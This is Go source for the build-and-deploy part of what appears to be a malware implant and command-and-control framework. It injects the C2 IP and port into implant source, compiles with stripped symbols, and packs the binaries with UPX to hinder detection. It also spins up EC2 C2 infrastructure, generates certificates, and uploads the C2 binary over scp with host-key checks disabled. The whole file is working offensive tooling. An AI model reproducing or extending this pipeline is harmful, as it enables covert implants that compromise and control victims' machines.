package main

import (
	"io/ioutil"
	"log"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

func checkError(err error) {
	if err != nil {
		panic(err)
	}
}

func (project *project) preprocess_file(data []byte) []byte {
	sdata := string(data)

	// Replace imports
	sdata = strings.Replace(sdata, "malware/", project.srcid+"/", -1)

	sdata = strings.Replace(sdata, "_C2_IP_", project.ip, -1)
	sdata = strings.Replace(sdata, "_C2_PORT_", strconv.Itoa(project.port), -1)

	modules_create := ""
	modules_import := ""
	for _, module := range project.modules {
		modules_create += module + ".Create(),\n"
		modules_import += "\"" + project.srcid + "/implant/modules/" + module + "\"\n"
	}
	sdata = strings.Replace(sdata, "_INCLUDED_MODULES_IMPORT_", modules_import, -1)
	sdata = strings.Replace(sdata, "_INCLUDED_MODULES_", modules_create, -1)

	return []byte(sdata)
}

func (project *project) visit(path string, f os.FileInfo, err error) error {
	newpath := project.srcdir + "/" + path
	if f.IsDir() {
		os.MkdirAll(newpath, os.ModePerm)
	} else {
		input, err := ioutil.ReadFile(path)
		if err != nil {
			return err
		}

		data := project.preprocess_file(input)

		err = ioutil.WriteFile(newpath, data, 0644)
		return err
	}

	return nil
}

func (project *project) compile(program string) (string, error) {
	tmpfile, err := ioutil.TempFile("", "*.bin")
	if err != nil {
		return "", err
	}

	out, err := exec.Command("go", "build", "-o", tmpfile.Name(), "-ldflags", "-s -w", program).CombinedOutput()

	if err != nil {
		log.Println(string(out))
		return "", err
	}

	out, err = exec.Command("upx", tmpfile.Name()).CombinedOutput()

	if err != nil {
		log.Println(string(out))
		return "", err
	}

	return tmpfile.Name(), nil
}

// Gen ssh keys + ec2 ip
func (project *project) generate_c2_ip() (string, string) {
	cmd := exec.Command("bash", "./c2_up")

	log.Println("Bringing up c2 infra")
	ip, err := cmd.Output()

	if ip == nil {
		log.Println("Got null IP, err: %s", err)
		return "", ""
	}
	log.Println("C2 up on ", string(ip), " Waiting 15 seconds...")
	time.Sleep(15 * time.Second)
	return strings.TrimSpace(string(ip)), "./id_c2"
}

func (project *project) uploadC2(loc string, priv_key string) error {
	cmd := exec.Command("bash", "-c", "scp -i "+priv_key+" -o \"StrictHostKeyChecking no\" "+loc+" ec2-user@"+project.ip+":~/c2")

	log.Println("Uploading c2")
	if out, err := cmd.CombinedOutput(); err != nil {
		log.Println(string(out))
		return err
	}

	cmd = exec.Command("bash", "-c", "scp -i "+priv_key+" -o \"StrictHostKeyChecking no\" "+project.srcdir+"/cert.pem ec2-user@"+project.ip+":~/cert.pem")
	if err := cmd.Run(); err != nil {
		return err
	}

	cmd = exec.Command("bash", "-c", "scp -i "+priv_key+" -o \"StrictHostKeyChecking no\" "+project.srcdir+"/key.pem ec2-user@"+project.ip+":~/key.pem")
	if err := cmd.Run(); err != nil {
		return err
	}
	log.Println("Crts uploaded")
	// WE Don't execute c2 until they login
	/**
	buffer, err := ioutil.ReadFile(priv_key)
	if err != nil {
		return err
	}

	key, err := ssh.ParsePrivateKey(buffer)
	if err != nil {
		return err
	}

	sshConfig := &ssh.ClientConfig{
		User: "ec2-user",
		Auth: []ssh.AuthMethod{ssh.PublicKeys(key)},
		HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
			return nil
		},
	}
	log.Println("Connecting to c2 ssh")
	connection, err := ssh.Dial("tcp", project.ip+":22", sshConfig)
	if err != nil {
		return err
	}

	session, err := connection.NewSession()
	if err != nil {
		return err
	}
	err = session.Run("screen -d -m -S c2 ./c2 cert.pem key.pem ")
	if err != nil {
		return err
	}*/
	return nil
}

func (project *project) compile_c2_implant() {
	// Generate cert/key
	// Generate IP for c2
	// Copy source to /tmp dir
	// Preprocess %keys%, %options%
	// build and copy binaries somewhere
	// Upload and run c2 binary

	// Create temp dir
	tmpdir, err := ioutil.TempDir(os.Getenv("GOPATH"), "src/waterpistol")
	id := strings.Split(tmpdir, "src/")[1]

	checkError(err)

	log.Println("Tmp dir created", tmpdir)
	defer os.RemoveAll(tmpdir)

	project.srcdir = tmpdir
	project.srcid = id

	// Genereate ec2
	c2_ip, c2_priv_key_file := project.generate_c2_ip()
	if c2_ip == "" {
		panic("Got empty c2 ip, spinup failed")
	}

	project.ip = c2_ip
	project.port = rand.Intn(65535) + 1 // Port between 5->35000

	// Copy source for implant and c2
	checkError(filepath.Walk("implant", project.visit))
	checkError(filepath.Walk("c2", project.visit))
	checkError(filepath.Walk("common", project.visit))

	log.Println("Source copied")

	GenCerts(project.srcdir)
	log.Println("Certs generated")

	implant, err := project.compile(id + "/implant")
	checkError(err)
	log.Println("Binary implant: ", implant)

	c2, err := project.compile(id + "/c2")
	checkError(err)
	log.Println("Binary c2: ", c2)

	checkError(project.uploadC2(c2, c2_priv_key_file))
}
